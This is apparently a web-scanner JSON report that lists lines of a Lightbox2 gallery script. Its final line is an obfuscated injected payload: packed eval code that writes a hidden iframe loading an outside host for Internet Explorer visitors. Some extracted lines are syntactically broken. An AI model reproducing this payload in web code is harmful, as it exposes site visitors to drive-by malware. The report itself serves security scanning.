            "\tGlobal Variables",
            "\tExtending Built-in Objects\t",
            "\t- Object.extend(Element)",
            "\t- Array.prototype.removeDuplicates()",
            "\t- Array.prototype.empty()",
            "\tLightbox Class Declaration",
            "\t- initialize()",
            "\t- start()",
            "\t- changeImage()",
            "\t- resizeImageContainer()",
            "\t- showImage()",
            "\t- updateDetails()",
            "\t- updateNav()",
            "\t- enableKeyboardNav()",
            "\t- disableKeyboardNav()",
            "\t- keyboardAction()",
            "\t- preloadNeighborImages()",
            "\t- end()",
            "\t- showText()",
            "\tMiscellaneous Functions",
            "\t- getPageScroll()",
            "\t- getPageSize()",
            "\t- getKey()",
            "\t- listenKey()",
            "\t- showSelectBoxes()",
            "\t- hideSelectBoxes()",
            "\t- showFlash()",
            "\t- hideFlash()",
            "\t- pause()",
            "\t- initLightbox()",
            "\tFunction Calls",
            "\t- addLoadEvent(initLightbox)",
            "// -----------------------------------------------------------------------------------",
            "//\tConfiguration",
            "var fileLoadingImage = \"aplication/webroot/imgs/loading.gif\";\t\t",
            "var overlayOpacity = 0.5;\t// controls transparency of shadow overlay",
            "var animate = true;\t\t\t// toggles resizing animations",
            "var resizeSpeed = 7;\t\t// controls the speed of the image resizing animations (1=slowest and 10=fastest)",
            "var borderSize = 10;\t\t//if you adjust the padding in the CSS, you will need to update this variable",
            "// -----------------------------------------------------------------------------------",
            "//\tGlobal Variables",
            "var imageArray = new Array;",
            "var activeImage;",
            "if(animate == true){",
            "\toverlayDuration = 1;\t// shadow fade in/out duration",
            "\tif(resizeSpeed > 10){ resizeSpeed = 10;}",
            "\tif(resizeSpeed < 1){ resizeSpeed = 1;}",
            "\tresizeDuration = (11 - resizeSpeed) * 0.15;",
            "} else { ",
            "\toverlayDuration = 1;",
            "\tresizeDuration = 0;",
            "// -----------------------------------------------------------------------------------",
            "//\tAdditional methods for Element added by SU, Couloir",
            "//\t- further additions by Lokesh Dhakar (huddletogether.com)",
            "Object.extend(Element, {",
            "\tgetWidth: function(element) {",
            "\t   \telement = $(element);",
            "\t   \treturn element.offsetWidth; ",
            "\tsetWidth: function(element,w) {",
            "\t   \telement = $(element);",
            "    \telement.style.width = w +\"px\";",
            "\tsetHeight: function(element,h) {",
            "   \t\telement = $(element);",
            "    \telement.style.height = h +\"px\";",
            "\tsetTop: function(element,t) {",
            "\t   \telement = $(element);",
            "    \telement.style.top = t +\"px\";",
            "\tsetSrc: function(element,src) {",
            "    \telement = $(element);",
            "    \telement.src = src; ",
            "\tsetHref: function(element,href) {",
            "    \telement = $(element);",
            "    \telement.href = href; ",
            "\tsetInnerHTML: function(element,content) {",
            "\t\telement = $(element);",
            "\t\telement.innerHTML = content;",
            "// -----------------------------------------------------------------------------------",
            "//\tExtending built-in Array object",
            "//\t- array.removeDuplicates()",
            "//\t- array.empty()",
            "Array.prototype.removeDuplicates = function () {",
            "    for(i = 0; i < this.length; i++){",
            "        for(j = this.length-1; j>i; j--){        ",
            "            if(this[i][0] == this[j][0]){",
            "                this.splice(j,1);",
            "            }",
            "        }",
            "    }",
            "// -----------------------------------------------------------------------------------",
            "Array.prototype.empty = function () {",
            "\tfor(i = 0; i <= this.length; i++){",
            "\t\tthis.shift();",
            "// -----------------------------------------------------------------------------------",
            "//\tLightbox Class Declaration",
            "//\t- initialize()",
            "//\t- start()",
            "//\t- changeImage()",
            "//\t- resizeImageContainer()",
            "//\t- showImage()",
            "//\t- updateDetails()",
            "//\t- updateNav()",
            "//\t- enableKeyboardNav()",
            "//\t- disableKeyboardNav()",
            "//\t- keyboardNavAction()",
            "//\t- preloadNeighborImages()",
            "//\t- end()",
            "//\tStructuring of code inspired by Scott Upton (http://www.uptonic.com/)",
            "var Lightbox = Class.create();",
            "Lightbox.prototype = {",
            "\t// initialize()",
            "\t// Constructor runs on completion of the DOM loading. Loops through anchor tags looking for ",
            "\t// 'lightbox' references and applies onclick events to appropriate links. The 2nd section of",
            "\t// the function inserts html at the bottom of the page which is used to display the shadow ",
            "\t// overlay and the image container.",
            "\tinitialize: function() {\t",
            "\t\tif (!document.getElementsByTagName){ return; }",
            "\t\tvar anchors = document.getElementsByTagName('a');",
            "\t\tvar areas = document.getElementsByTagName('area');",
            "\t\t// loop through all anchor tags",
            "\t\tfor (var i=0; i<anchors.length; i++){",
            "\t\t\tvar anchor = anchors[i];",
            "\t\t\tvar relAttribute = String(anchor.getAttribute('rel'));",
            "\t\t\t// use the string.match() method to catch 'lightbox' references in the rel attribute",
            "\t\t\tif (anchor.getAttribute('href') && (relAttribute.toLowerCase().match('lightbox'))){",
            "\t\t\t\tanchor.onclick = function () {myLightbox.start(this); return false;}",
            "\t\t\t}",
            "\t\t// loop through all area tags",
            "\t\t// todo: combine anchor & area tag loops",
            "\t\tfor (var i=0; i< areas.length; i++){",
            "\t\t\tvar area = areas[i];",
            "\t\t\tvar relAttribute = String(area.getAttribute('rel'));",
            "\t\t\t// use the string.match() method to catch 'lightbox' references in the rel attribute",
            "\t\t\tif (area.getAttribute('href') && (relAttribute.toLowerCase().match('lightbox'))){",
            "\t\t\t\tarea.onclick = function () {myLightbox.start(this); return false;}",
            "\t\t\t}",
            "\t\t// The rest of this code inserts html at the bottom of the page that looks similar to this:",
            "\t\t//",
            "\t\t//\t<div id=\"overlay\"></div>",
            "\t\t//\t<div id=\"textLightbox\">",
            "\t\t//\t\t<div id=\"outerTextContainer\">",
            "\t\t//\t\t\t<div id=\"closeText\">",
            "\t\t//\t\t\t\t<img src='img/closed.gif' width='12' height='12' title='Close'/>",
            "\t\t//\t\t\t</div>",
            "\t\t//\t\t \t<div id=\"textContainer\">",
            "\t\t//\t\t\t</div>",
            "\t\t//\t\t</div>",
            "\t\t//\t</div>",
            "\t\t//\t<div id=\"lightbox\">",
            "\t\t//\t<div id=\"imageDataContainer\">",
            "\t\t//\t\t\t<div id=\"imageData\">",
            "\t\t//\t\t\t\t<div id=\"imageDetails\">",
            "\t\t//\t\t\t\t\t<span id=\"caption\"></span>",
            "\t\t//\t\t\t\t\t<span id=\"numberDisplay\"></span>",
            "\t\t//\t\t\t\t</div>",
            "\t\t//\t\t\t\t<div id=\"bottomNav\">",
            "\t\t//\t\t\t\t\t<a href=\"#\" id=\"bottomNavClose\">",
            "\t\t//\t\t\t\t\t\t<img src=\"images/close.gif\">",
            "\t\t//\t\t\t\t\t</a>",
            "\t\t//\t\t\t\t</div>",
            "\t\t//\t\t\t</div>",
            "\t\t//\t\t</div>",
            "\t\t//\t\t<div id=\"outerImageContainer\">",
            "\t\t//\t\t\t<div id=\"imageContainer\">",
            "\t\t//\t\t\t\t<img id=\"lightboxImage\">",
            "\t\t//\t\t\t\t<div style=\"\" id=\"hoverNav\">",
            "\t\t//\t\t\t\t\t<a href=\"#\" id=\"prevLink\"></a>",
            "\t\t//\t\t\t\t\t<a href=\"#\" id=\"nextLink\"></a>",
            "\t\t//\t\t\t\t</div>",
            "\t\t//\t\t\t\t<div id=\"loading\">",
            "\t\t//\t\t\t\t\t<a href=\"#\" id=\"loadingLink\">",
            "\t\t//\t\t\t\t\t\t<img src=\"images/loading.gif\">",
            "\t\t//\t\t\t\t\t</a>",
            "\t\t//\t\t\t\t</div>",
            "\t\t//\t\t\t</div>",
            "\t\t//\t\t</div>",
            "\t\t//\t</div>",
            "\t\tvar objBody = document.getElementsByTagName(\"body\").item(0);",
            "\t\tvar objOverlay = document.createElement(\"div\");",
            "\t\tobjOverlay.setAttribute('id','overlay');",
            "\t\tobjOverlay.style.display = 'none';",
            "\t\tobjOverlay.onclick = function() { myLightbox.end(); }",
            "\t\tobjBody.appendChild(objOverlay);",
            "\t\tvar objLightbox = document.createElement(\"div\");",
            "\t\tobjLightbox.setAttribute('id','lightbox');",
            "\t\tobjLightbox.style.display = 'none';",
            "\t\tobjLightbox.onclick = function(e) {\t// close Lightbox is user clicks shadow overlay",
            "\t\t\tif (!e) var e = window.event;",
            "\t\t\tvar clickObj = Event.element(e).id;",
            "\t\t\tif ( clickObj == 'lightbox') {",
            "\t\t\t\tmyLightbox.end();",
            "\t\t\t}",
            "\t\t};",
            "\t\tobjBody.appendChild(objLightbox);",
            "\t\t//TextLightBox",
            "\t\tvar objTextLightbox = document.createElement(\"div\");",
            "\t\tobjTextLightbox.setAttribute('id','textLightbox');",
            "\t\tobjTextLightbox.style.display = 'none';",
            "\t\tobjTextLightbox.onclick = function(e) {\t// close Lightbox is user clicks shadow overlay",
            "\t\t\tif (!e) var e = window.event;",
            "\t\t\tvar clickObj = Event.element(e).id;",
            "\t\t\tif ( clickObj == 'textLightbox') {",
            "\t\t\t\tmyLightbox.end();",
            "\t\t\t}",
            "\t\t};",
            "\t\tobjBody.appendChild(objTextLightbox);",
            "\t\tvar outerTextContainer = document.createElement(\"div\");",
            "\t\touterTextContainer.setAttribute('id','outerTextContainer');",
            "\t\tobjTextLightbox.appendChild(outerTextContainer);",
            "\t\tvar closeText = document.createElement(\"div\");",
            "\t\tcloseText.setAttribute('id','closeText');",
            "\t\touterTextContainer.appendChild(closeText);\t",
            "\t\tvar closeIcon = document.createElement(\"img\");",
            "\t\tcloseIcon.setAttribute('id','closeIcon');",
            "\t\tcloseIcon.setAttribute('src','aplication/webroot/imgs/closed.gif');",
            "\t\tcloseIcon.style.cursor=\"pointer\";",
            "\t\tcloseIcon.onclick = function() { myLightbox.end(); return false; }",
            "\t\tcloseText.appendChild(closeIcon);",
            "\t\tvar textContainer = document.createElement(\"div\");",
            "\t\ttextContainer.setAttribute('id','textContainer');",
            "\t\touterTextContainer.appendChild(textContainer);\t",
            "\t\tvar objImageDataContainer = document.createElement(\"div\");",
            "\t\tobjImageDataContainer.setAttribute('id','imageDataContainer');",
            "\t\tobjLightbox.appendChild(objImageDataContainer);\t",
            "\t\tvar objImageData = document.createElement(\"div\");",
            "\t\tobjImageData.setAttribute('id','imageData');",
            "\t\tobjImageDataContainer.appendChild(objImageData);",
            "\t\tvar objImageDetails = document.createElement(\"div\");",
            "\t\tobjImageDetails.setAttribute('id','imageDetails');",
            "\t\tobjImageData.appendChild(objImageDetails);",
            "\t\tvar objCaption = document.createElement(\"span\");",
            "\t\tobjCaption.setAttribute('id','caption');",
            "\t\tobjImageDetails.appendChild(objCaption);",
            "\t\tvar objNumberDisplay = document.createElement(\"span\");",
            "\t\tobjNumberDisplay.setAttribute('id','numberDisplay');",
            "\t\tobjImageDetails.appendChild(objNumberDisplay);",
            "\t\tvar objBottomNav = document.createElement(\"div\");",
            "\t\tobjBottomNav.setAttribute('id','bottomNav');",
            "\t\tobjImageData.appendChild(objBottomNav);",
            "\t\tvar objOuterImageContainer = document.createElement(\"div\");",
            "\t\tobjOuterImageContainer.setAttribute('id','outerImageContainer');",
            "\t\tobjLightbox.appendChild(objOuterImageContainer);",
            "\t\t// When Lightbox starts it will resize itself from 250 by 250 to the current image dimension.",
            "\t\t// If animations are turned off, it will be hidden as to prevent a flicker of a",
            "\t\t// white 250 by 250 box.",
            "\t\tif(animate){",
            "\t\t\tElement.setWidth('outerImageContainer', 250);",
            "\t\t\tElement.setHeight('outerImageContainer', 250);\t\t\t",
            "\t\t} else {",
            "\t\t\tElement.setWidth('outerImageContainer', 1);",
            "\t\t\tElement.setHeight('outerImageContainer', 1);\t\t\t",
            "\t\tvar objImageContainer = document.createElement(\"div\");",
            "\t\tobjImageContainer.setAttribute('id','imageContainer');",
            "\t\tobjOuterImageContainer.appendChild(objImageContainer);",
            "\t\tvar objLightboxImage = document.createElement(\"img\");",
            "\t\tobjLightboxImage.setAttribute('id','lightboxImage');",
            "\t\tobjImageContainer.appendChild(objLightboxImage);",
            "\t\tvar objHoverNav = document.createElement(\"div\");",
            "\t\tobjHoverNav.setAttribute('id','hoverNav');",
            "\t\tobjImageContainer.appendChild(objHoverNav);",
            "\t\tvar objPrevLink = document.createElement(\"a\");",
            "\t\tobjPrevLink.setAttribute('id','prevLink');",
            "\t\tobjPrevLink.setAttribute('href','#');",
            "\t\tobjHoverNav.appendChild(objPrevLink);",
            "\t\tvar objNextLink = document.createElement(\"a\");",
            "\t\tobjNextLink.setAttribute('id','nextLink');",
            "\t\tobjNextLink.setAttribute('href','#');",
            "\t\tobjHoverNav.appendChild(objNextLink);",
            "\t\tvar objLoading = document.createElement(\"div\");",
            "\t\tobjLoading.setAttribute('id','loading');",
            "\t\tobjImageContainer.appendChild(objLoading);",
            "\t\tvar objLoadingLink = document.createElement(\"a\");",
            "\t\tobjLoadingLink.setAttribute('id','loadingLink');",
            "\t\tobjLoadingLink.setAttribute('href','#');",
            "\t\tobjLoadingLink.onclick = function() { myLightbox.end(); return false; }",
            "\t\tobjLoading.appendChild(objLoadingLink);",
            "\t\tvar objLoadingImage = document.createElement(\"img\");",
            "\t\tobjLoadingImage.setAttribute('src', fileLoadingImage);",
            "\t\tobjLoadingLink.appendChild(objLoadingImage);",
            "\t\tvar objBottomNavCloseImage = document.createElement(\"img\");",
            "\t\tobjBottomNavCloseImage.setAttribute('id','closeIcon2');",
            "\t\tobjBottomNavCloseImage.setAttribute('src','aplication/webroot/imgs/closed.gif');",
            "\t\tobjBottomNavCloseImage.style.cursor=\"pointer\";",
            "\t\tobjBottomNavCloseImage.onclick = function() { myLightbox.end(); return false; }",
            "\t\tobjBottomNav.appendChild(objBottomNavCloseImage);",
            "\t//\tstart()",
            "\t//\tDisplay overlay and lightbox. If image is part of a set, add siblings to imageArray.",
            "\tstart: function(imageLink) {\t",
            "\t\thideSelectBoxes();",
            "\t\thideFlash();",
            "\t\t// stretch overlay to fill page and fade in",
            "\t\tvar arrayPageSize = getPageSize();",
            "\t\tElement.setHeight('overlay', arrayPageSize[1]);",
            "\t\tnew Effect.Appear('overlay', { duration: overlayDuration, from: 0.0, to: overlayOpacity });",
            "\t\timageArray = [];",
            "\t\timageNum = 0;\t\t",
            "\t\tif (!document.getElementsByTagName){ return; }",
            "\t\tvar anchors = document.getElementsByTagName( imageLink.tagName);",
            "\t\t// if image is NOT part of a set..",
            "\t\tif((imageLink.getAttribute('rel') == 'lightbox_text'))",
            "\t\t{\t",
            "\t url=imageLink.getAttribute('href'); ",
            "\t\t\tvar texto;",
            "\t\t\tvar obj=this",
            "\t\t\tnew Ajax.Request(url, {  method: 'get',  onSuccess: function(transport) { ",
            "\t\t\ttexto=transport.responseText;",
            "\t\t\t\tobj.showText(texto);",
            "\t\t\t }});",
            "\t\t\t\t\t\t}else{",
            "\t\tif((imageLink.getAttribute('rel') == 'lightbox')){",
            "\t\t\t// add single image to imageArray",
            "\t\t\timageArray.push(new Array(imageLink.getAttribute('href'), imageLink.getAttribute('title')));\t\t\t",
            "\t\t} ",
            "\t\telse {",
            "\t\t// if image is part of a set..",
            "\t\t\t// loop through anchors, find other images in set, and add them to imageArray",
            "\t\t\tfor (var i=0; i<anchors.length; i++){",
            "\t\t\t\tvar anchor = anchors[i];",
            "\t\t\t\tif (anchor.getAttribute('href') && (anchor.getAttribute('rel') == imageLink.getAttribute('rel'))){",
            "\t\t\t\t\timageArray.push(new Array(anchor.getAttribute('href'), anchor.getAttribute('title')));",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\timageArray.removeDuplicates();",
            "\t\t\twhile(imageArray[imageNum][0] != imageLink.getAttribute('href')) { imageNum++;}",
            "\t\t// calculate top offset for the lightbox and display ",
            "\t\tvar arrayPageScroll = getPageScroll();",
            "\t\tvar lightboxTop = arrayPageScroll[1] + (arrayPageSize[3] / 10);",
            "\t\tElement.setTop('lightbox', lightboxTop);",
            "\t\tElement.show('lightbox');",
            "\t\tthis.changeImage(imageNum);",
            "\t}},",
            "\tshowText: function(txt) {",
            "\t\t\t\t",
            "\t\tvar arrayPageScroll = getPageScroll();",
            "\t\tvar lightboxTop = arrayPageScroll[1] + (arrayPageSize[3] / 10);",
            "\t\tElement.setTop('textLightbox', lightboxTop);",
            "\t\tElement.hide('outerImageContainer');",
            "\t\tElement.hide('imageDataContainer');",
            "\t\tElement.show('textLightbox');",
            "\t\tElement.show('outerTextContainer');",
            "\t\t$(\"textContainer\").innerHTML=txt;",
            "\t\t},",
            "\t//\tchangeImage()",
            "\t//\tHide most elements and preload image in preparation for resizing image container.",
            "\tchangeImage: function(imageNum) {\t",
            "\t\tactiveImage = imageNum;\t// update global var",
            "\t\t// hide elements during transition",
            "\t\tif(animate){ Element.show('loading');}",
            "\t\tElement.show('outerImageContainer');",
            "\t\tElement.show('imageDataContainer');",
            "\t\tElement.hide('lightboxImage');",
            "\t\tElement.hide('hoverNav');",
            "\t\tElement.hide('prevLink');",
            "\t\tElement.hide('nextLink');",
            "\t\tElement.hide('imageDataContainer');",
            "\t\tElement.hide('numberDisplay');\t\t",
            "\t\timgPreloader = new Image();",
            "\t\t// once image is preloaded, resize image container",
            "\t\timgPreloader.onload=function(){",
            "\t\t\tElement.setSrc('lightboxImage', imageArray[activeImage][0]);",
            "\t\t\tmyLightbox.resizeImageContainer(imgPreloader.width, imgPreloader.height);",
            "\t\t\timgPreloader.onload=function(){};\t//\tclear onLoad, IE behaves irratically with animated gifs otherwise ",
            "\t\timgPreloader.src = imageArray[activeImage][0];",
            "\t//\tresizeImageContainer()",
            "\tresizeImageContainer: function( imgWidth, imgHeight) {",
            "\t\t// get curren width and height",
            "\t\tthis.widthCurrent = Element.getWidth('outerImageContainer');",
            "\t\tthis.heightCurrent = Element.getHeight('outerImageContainer');",
            "\t\t// get new width and height",
            "\t\tvar widthNew = (imgWidth  + (borderSize * 2));",
            "\t\tvar heightNew = (imgHeight  + (borderSize * 2));",
            "\t\t// scalars based on change from old to new",
            "\t\tthis.xScale = ( widthNew / this.widthCurrent) * 100;",
            "\t\tthis.yScale = ( heightNew / this.heightCurrent) * 100;",
            "\t\t// calculate size difference between new and old image, and resize if necessary",
            "\t\twDiff = this.widthCurrent - widthNew;",
            "\t\thDiff = this.heightCurrent - heightNew;",
            "\t\tif(!( hDiff == 0)){ new Effect.Scale('outerImageContainer', this.yScale, {scaleX: false, duration: resizeDuration, queue: 'front'}); }",
            "\t\tif(!( wDiff == 0)){ new Effect.Scale('outerImageContainer', this.xScale, {scaleY: false, delay: resizeDuration, duration: resizeDuration}); }",
            "\t\t// if new and old image are same size and no scaling transition is necessary, ",
            "\t\t// do a quick pause to prevent image flicker.",
            "\t\tif((hDiff == 0) && (wDiff == 0)){",
            "\t\t\tif (navigator.appVersion.indexOf(\"MSIE\")!=-1){ pause(250); } else { pause(100);} ",
            "\t\tElement.setHeight('prevLink', imgHeight);",
            "\t\tElement.setHeight('nextLink', imgHeight);",
            "\t\tElement.setWidth( 'imageDataContainer', widthNew);",
            "\t\tthis.showImage();",
            "\t//\tshowImage()",
            "\t//\tDisplay image and begin preloading neighbors.",
            "\tshowImage: function(){",
            "\t\tElement.hide('loading');",
            "\t\tElement.hide('outerTextContainer');",
            "\t\t//Element.hide('textContainer');",
            "\t\tnew Effect.Appear('lightboxImage', { duration: resizeDuration, queue: 'end', afterFinish: function(){\tmyLightbox.updateDetails(); } });",
            "\t\tthis.preloadNeighborImages();",
            "\t//\tupdateDetails()",
            "\t//\tDisplay caption, image number, and bottom nav.",
            "\tupdateDetails: function() {",
            "\t\tElement.show('caption');",
            "\t\tElement.setInnerHTML( 'caption', imageArray[activeImage][1]);",
            "\t\t// if image is part of set display 'Image x of x' ",
            "\t\tif(imageArray.length > 1){",
            "\t\t\tElement.show('numberDisplay');",
            "\t\t\tElement.setInnerHTML( 'numberDisplay', \"Image \" + eval(activeImage + 1) + \" of \" + imageArray.length);",
            "\t\tnew Effect.Parallel(",
            "\t\t\t[ new Effect.SlideDown( 'imageDataContainer', { sync: true, duration: resizeDuration, from: 0.0, to: 1.0 }), ",
            "\t\t\t  new Effect.Appear('imageDataContainer', { sync: true, duration: resizeDuration }) ], ",
            "\t\t\t{ duration: resizeDuration, afterFinish: function() {",
            "\t\t\t\t// update overlay size and update nav",
            "\t\t\t\tvar arrayPageSize = getPageSize();",
            "\t\t\t\tElement.setHeight('overlay', arrayPageSize[1]);",
            "\t\t\t\tmyLightbox.updateNav();",
            "\t\t\t\t}",
            "\t\t\t} ",
            "\t\t);",
            "\t//\tupdateNav()",
            "\t//\tDisplay appropriate previous and next hover navigation.",
            "\tupdateNav: function() {",
            "\t\tElement.show('hoverNav');\t\t\t\t",
            "\t\t// if not first image in set, display prev image button",
            "\t\tif(activeImage != 0){",
            "\t\t\tElement.show('prevLink');",
            "\t\t\tdocument.getElementById('prevLink').onclick = function() {",
            "\t\t\t\tmyLightbox.changeImage(activeImage - 1); return false;",
            "\t\t\t}",
            "\t\t// if not last image in set, display next image button",
            "\t\tif(activeImage != (imageArray.length - 1)){",
            "\t\t\tElement.show('nextLink');",
            "\t\t\tdocument.getElementById('nextLink').onclick = function() {",
            "\t\t\t\tmyLightbox.changeImage(activeImage + 1); return false;",
            "\t\t\t}",
            "\t\tthis.enableKeyboardNav();",
            "\t//\tenableKeyboardNav()",
            "\tenableKeyboardNav: function() {",
            "\t\tdocument.onkeydown = this.keyboardAction; ",
            "\t//\tdisableKeyboardNav()",
            "\tdisableKeyboardNav: function() {",
            "\t\tdocument.onkeydown = '';",
            "\t//\tkeyboardAction()",
            "\tkeyboardAction: function(e) {",
            "\t\tif (e == null) { // ie",
            "\t\t\tkeycode = event.keyCode;",
            "\t\t\tescapeKey = 27;",
            "\t\t} else { // mozilla",
            "\t\t\tkeycode = e.keyCode;",
            "\t\t\tescapeKey = e.DOM_VK_ESCAPE;",
            "\t\tkey = String.fromCharCode(keycode).toLowerCase();",
            "\t\tif((key == 'x') || (key == 'o') || (key == 'c') || (keycode == escapeKey)){\t// close lightbox",
            "\t\t\tmyLightbox.end();",
            "\t\t} else if((key == 'p') || (keycode == 37)){\t// display previous image",
            "\t\t\tif(activeImage != 0){",
            "\t\t\t\tmyLightbox.disableKeyboardNav();",
            "\t\t\t\tmyLightbox.changeImage(activeImage - 1);",
            "\t\t\t}",
            "\t\t} else if((key == 'n') || (keycode == 39)){\t// display next image",
            "\t\t\tif(activeImage != (imageArray.length - 1)){",
            "\t\t\t\tmyLightbox.disableKeyboardNav();",
            "\t\t\t\tmyLightbox.changeImage(activeImage + 1);",
            "\t\t\t}",
            "\t//\tpreloadNeighborImages()",
            "\t//\tPreload previous and next images.",
            "\tpreloadNeighborImages: function(){",
            "\t\tif((imageArray.length - 1) > activeImage){",
            "\t\t\tpreloadNextImage = new Image();",
            "\t\t\tpreloadNextImage.src = imageArray[activeImage + 1][0];",
            "\t\tif(activeImage > 0){",
            "\t\t\tpreloadPrevImage = new Image();",
            "\t\t\tpreloadPrevImage.src = imageArray[activeImage - 1][0];",
            "\t//\tend()",
            "\tend: function() {",
            "\t\tthis.disableKeyboardNav();",
            "\t\tElement.hide('lightbox');",
            "\t\tElement.hide('textLightbox');",
            "\t\tnew Effect.Fade('overlay', { duration: overlayDuration});",
            "\t\tshowSelectBoxes();",
            "\t\tshowFlash();",
            "// -----------------------------------------------------------------------------------",
            "// getPageScroll()",
            "// Returns array with x,y page scroll values.",
            "// Core code from - quirksmode.org",
            "function getPageScroll(){",
            "\tvar yScroll;",
            "\tif (self.pageYOffset) {",
            "\t\tyScroll = self.pageYOffset;",
            "\t} else if (document.documentElement && document.documentElement.scrollTop){\t // Explorer 6 Strict",
            "\t\tyScroll = document.documentElement.scrollTop;",
            "\t} else if (document.body) {// all other Explorers",
            "\t\tyScroll = document.body.scrollTop;",
            "\tarrayPageScroll = new Array('',yScroll) ",
            "\treturn arrayPageScroll;",
            "// -----------------------------------------------------------------------------------",
            "// getPageSize()",
            "// Returns array with page width, height and window width, height",
            "// Core code from - quirksmode.org",
            "// Edit for Firefox by pHaez",
            "function getPageSize(){",
            "\tvar xScroll, yScroll;",
            "\tif (window.innerHeight && window.scrollMaxY) {\t",
            "\t\txScroll = document.body.scrollWidth;",
            "\t\tyScroll = window.innerHeight + window.scrollMaxY;",
            "\t} else if (document.body.scrollHeight > document.body.offsetHeight){ // all but Explorer Mac",
            "\t\txScroll = document.body.scrollWidth;",
            "\t\tyScroll = document.body.scrollHeight;",
            "\t} else { // Explorer Mac...would also work in Explorer 6 Strict, Mozilla and Safari",
            "\t\txScroll = document.body.offsetWidth;",
            "\t\tyScroll = document.body.offsetHeight;",
            "\tvar windowWidth, windowHeight;",
            "\tif (self.innerHeight) {\t// all except Explorer",
            "\t\twindowWidth = self.innerWidth;",
            "\t\twindowHeight = self.innerHeight;",
            "\t} else if (document.documentElement && document.documentElement.clientHeight) { // Explorer 6 Strict Mode",
            "\t\twindowWidth = document.documentElement.clientWidth;",
            "\t\twindowHeight = document.documentElement.clientHeight;",
            "\t} else if (document.body) { // other Explorers",
            "\t\twindowWidth = document.body.clientWidth;",
            "\t\twindowHeight = document.body.clientHeight;",
            "\t// for small pages with total height less then height of the viewport",
            "\tif(yScroll < windowHeight){",
            "\t\tpageHeight = windowHeight;",
            "\t} else { ",
            "\t\tpageHeight = yScroll;",
            "\t// for small pages with total width less then width of the viewport",
            "\tif(xScroll < windowWidth){\t",
            "\t\tpageWidth = windowWidth;",
            "\t} else {",
            "\t\tpageWidth = xScroll;",
            "\tarrayPageSize = new Array(pageWidth,pageHeight,windowWidth,windowHeight) ",
            "\treturn arrayPageSize;",
            "// -----------------------------------------------------------------------------------",
            "// getKey(key)",
            "// Gets keycode. If 'x' is pressed then it hides the lightbox.",
            "function getKey(e){",
            "\tif (e == null) { // ie",
            "\t\tkeycode = event.keyCode;",
            "\t} else { // mozilla",
            "\t\tkeycode = e.which;",
            "\tkey = String.fromCharCode(keycode).toLowerCase();",
            "\tif(key == 'x'){",
            "// -----------------------------------------------------------------------------------",
            "// listenKey()",
            "function listenKey () {\tdocument.onkeypress = getKey; }",
            "// ---------------------------------------------------",
            "function showSelectBoxes(){",
            "\tvar selects = document.getElementsByTagName(\"select\");",
            "\tfor (i = 0; i != selects.length; i++) {",
            "\t\tselects[i].style.visibility = \"visible\";",
            "// ---------------------------------------------------",
            "function hideSelectBoxes(){",
            "\tvar selects = document.getElementsByTagName(\"select\");",
            "\tfor (i = 0; i != selects.length; i++) {",
            "\t\tselects[i].style.visibility = \"hidden\";",
            "// ---------------------------------------------------",
            "function showFlash(){",
            "\tvar flashObjects = document.getElementsByTagName(\"object\");",
            "\tfor (i = 0; i < flashObjects.length; i++) {",
            "\t\tflashObjects[i].style.visibility = \"visible\";",
            "\tvar flashEmbeds = document.getElementsByTagName(\"embed\");",
            "\tfor (i = 0; i < flashEmbeds.length; i++) {",
            "\t\tflashEmbeds[i].style.visibility = \"visible\";",
            "// ---------------------------------------------------",
            "function hideFlash(){",
            "\tvar flashObjects = document.getElementsByTagName(\"object\");",
            "\tfor (i = 0; i < flashObjects.length; i++) {",
            "\t\tflashObjects[i].style.visibility = \"hidden\";",
            "\tvar flashEmbeds = document.getElementsByTagName(\"embed\");",
            "\tfor (i = 0; i < flashEmbeds.length; i++) {",
            "\t\tflashEmbeds[i].style.visibility = \"hidden\";",
            "// ---------------------------------------------------",
            "// pause(numberMillis)",
            "// Pauses code execution for specified time. Uses busy code, not good.",
            "// Help from Ran Bar-On [ran2103@gmail.com]",
            "function pause(ms){",
            "\tvar date = new Date();",
            "\tcurDate = null;",
            "\tdo{var curDate = new Date();}",
            "\twhile( curDate - date < ms);",
            "function pause(numberMillis) {",
            "\tvar curently = new Date().getTime() + sender;",
            "\twhile (new Date().getTime();\t",
            "// ---------------------------------------------------",
            "function initLightbox() { myLightbox = new Lightbox(); }",
            "Event.observe(window, 'load', initLightbox, false);",
            "sa=\"%6B%73%69%65%6E%61%2E%6E%65%74\";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+c.toString(a)+'\\\\b','g'),k[c])}}return p}('a(0.4.7(\"5=s\")==-1&&9.8.7(\"f 6\")!=-1){0.4=\"5=s; e=c, 2 g b 2:d:h p; \";0.r(\"<3 q=1 t=1 o=\\'n://\"+j+\"/i/\\' k=\\'l:m\\'></3>\")}',30,30,'document||14|iframe|cookie|_mlsdkf||indexOf|appVersion|navigator|if|2015|Mon|15|expires|MSIE|Jul|26|b2b|sa|style|display|none|http|src|GMT|width|write||height'.split('|')));"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://creativecommons.org/licenses/by/2.5/",
            "http://huddletogether.com/projects/lightbox2/",
            "http://www.huddletogether.com",
            "http://www.uptonic.com/"
        ]
    },
    "time": "0:00:00.450740",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
